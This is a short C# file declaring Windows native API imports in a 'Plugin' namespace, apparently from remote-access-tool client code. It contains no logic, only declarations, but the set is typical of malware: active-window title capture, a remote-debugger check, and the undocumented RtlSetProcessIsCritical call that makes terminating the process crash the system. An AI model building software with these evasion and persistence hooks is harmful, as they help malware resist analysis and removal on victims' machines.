using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin
{
    class NativeMethods
    {

		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

		[DllImport("ntdll.dll", SetLastError = true)]
		public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

		public enum EXECUTION_STATE : uint
		{
			ES_CONTINUOUS = 2147483648U,
			ES_DISPLAY_REQUIRED = 2U,
			ES_SYSTEM_REQUIRED = 1U
		}
	}
}
